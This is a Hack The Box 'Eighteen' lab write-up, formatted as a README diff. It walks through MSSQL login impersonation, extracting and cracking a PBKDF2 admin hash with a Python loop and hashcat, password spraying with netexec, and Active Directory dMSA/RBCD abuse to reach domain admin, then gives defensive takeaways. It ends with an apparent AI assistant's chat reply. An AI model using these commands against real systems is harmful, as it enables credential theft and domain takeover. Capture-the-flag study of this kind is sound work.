@@ -1,0 +1,218 @@
+HTB Eighteen - Offensive Security Writeup
+Machine: [Eighteen](https://app.hackthebox.com/machines/Eighteen)  
+Difficulty: Easy  
+Platform: Hack The Box  
+OS: Windows (Active Directory Domain Controller)  
+Goal: User + Root flags  
+Date: March 2026  
+
+🎯 Executive Summary
+
+This repository documents a complete, educational walkthrough of the **HTB Eighteen** machine. 
+The attack chain begins with provided MSSQL credentials, leverages database impersonation to extract a PBKDF2-SHA256 hash, cracks the hash offline, performs password spraying for lateral movement, and concludes with Active Directory ACL abuse (dMSA / BadSuccessor) 
+for domain admin escalation.
+
+  
+
+Key Skills Demonstrated:
+
+- MSSQL enumeration & impersonation
+
+- Hash cracking (PBKDF2-SHA256)
+
+- Impacket tooling & troubleshooting
+
+- Active Directory enumeration & ACL exploitation
+
+- Systematic methodology & error handling
+
+  
+
+---
+
+  
+
+🛠️ Attack Overview
+
+1. Initial Access → MSSQL (1433) with provided creds (`kevin:iNa2we6haRj2gaw!`)
+
+2. Privilege Escalation (DB) → Impersonate `appdev` → Extract admin hash
+
+3. Credential Cracking → PBKDF2-SHA256 → `iloveyou1`
+
+4. Lateral Movement → Password spraying → WinRM as `adam.scott`
+
+5. Domain Privilege Escalation → CreateChild on Staff OU → dMSA / RBCD abuse → Domain Admin
+
+  
+
+---
+
+  
+
+🔍 1. MSSQL Connection & Troubleshooting
+
+  
+Tool Used: `impacket-mssqlclient` (v0.13.0.dev0)
+
+  
+
+Initial Command Attempts (Common Pitfalls)
+
+```bash
+
+❌ Failed - missing @ separator
+
+impacket-mssqlclient kevin:'iNa2we6haRj2gaw!' -target-ip 10.10.11.252
+
+  
+
+❌ Failed - space before @ (argparse error)
+
+impacket-mssqlclient kevin:'iNa2we6haRj2gaw!' @10.10.11.252
+
+# Error: unrecognized arguments: @xxx.xxx.xxx.xxx
+
+Corrected Command
+
+impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.10.11.252
+
+or with hostname + IP override
+
+impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb -target-ip 10.10.11.252
+
+Lesson: Impacket expects a single positional argument in the format username:password@target. Spaces break argparse.
+
+🔑 2. Database Impersonation & Hash Extraction
+Inside MSSQL (SQL> prompt):
+
+
+-- Check current context
+
+SELECT SUSER_NAME();
+
+  
+
+-- Verify impersonation rights
+
+SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER') WHERE permission_name = 'IMPERSONATE';
+
+  
+
+-- Impersonate higher-privileged login
+
+EXECUTE AS LOGIN = 'appdev';
+
+  
+
+-- Switch database (error resolved)
+
+USE financial_planner;
+
+  
+
+-- Enumerate tables
+
+SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = 'dbo';
+
+  
+
+-- Extract users table
+
+SELECT * FROM users;
+
+Extracted Hash (admin user):
+
+
+pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
+
+Error Encountered:
+
+
+ERROR(DC01): The server principal "kevin" is not able to access the database "financial_planner"
+
+Root Cause: Low-priv login lacked direct DB access → resolved via EXECUTE AS.
+
+🔨 3. Offline Hash Cracking
+Format Analysis:
+
+Algorithm: PBKDF2-HMAC-SHA256
+
+Iterations: 600,000
+
+Salt: AMtzteQIG7yAbZIa (UTF-8 / base64)
+
+Digest: hex → must be converted to base64 for Hashcat
+
+Python Cracker (Proof-of-Concept)
+
+import hashlib, binascii
+
+
+salt = b'AMtzteQIG7yAbZIa'
+
+iterations = 600000
+
+expected = '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
+
+  
+
+for pwd in ["iloveyou", "iloveyou1", "admin123"]:
+
+    dk = hashlib.pbkdf2_hmac('sha256', pwd.encode(), salt, iterations)
+
+    if binascii.hexlify(dk).decode() == expected:
+
+        print(f"[+] Password: {pwd}")
+
+Hashcat-Ready Format
+Corrected hash line (saved as hash.txt):
+
+
+sha256:600000:AMtzteQIG7yAbZIa:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
+
+Command:
+
+
+hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt -O
+
+Result: iloveyou1
+
+📈 4. Full Attack Chain Summary (Post-Foothold)
+Password Spraying: netexec smb 10.10.11.252 -u users.txt -p iloveyou1 --local-auth
+
+Foothold: WinRM as adam.scott
+
+Privilege Escalation: PowerView → Find-InterestingDomainAcl → CreateChild on Staff OU → dMSA object creation → Resource-Based Constrained Delegation (RBCD) → Domain Admin shell
+
+Flags Obtained:
+
+  - User flag: C:\Users\adam.scott\Desktop\user.txt
+
+  - Root flag: C:\Users\Administrator\Desktop\root.txt
+
+🛡️ Defensive Takeaways
+Restrict IMPERSONATE grants in MSSQL
+
+Never store credential hashes in application databases
+
+Audit OU permissions (CreateChild) in Active Directory
+
+Monitor for anomalous SQL context switches and dMSA object creation
+
+📚 Skills Demonstrated in This Writeup
+Deep MSSQL permission chaining
+
+Impacket syntax mastery & debugging
+
+Custom hash format conversion (PBKDF2 → Hashcat)
+
+Systematic troubleshooting documentation
+
+Full AD attack chain reasoning
+
+Repository Purpose: Educational only. All steps were performed in an authorized Hack The Box lab environment.
+
+  
+
+Copy-paste the above directly into a `README.md` file for your GitHub repository. It showcases methodology, error handling, and technical depth while remaining concise and professional. Let me know if you want screenshots, additional sections, or a variation!
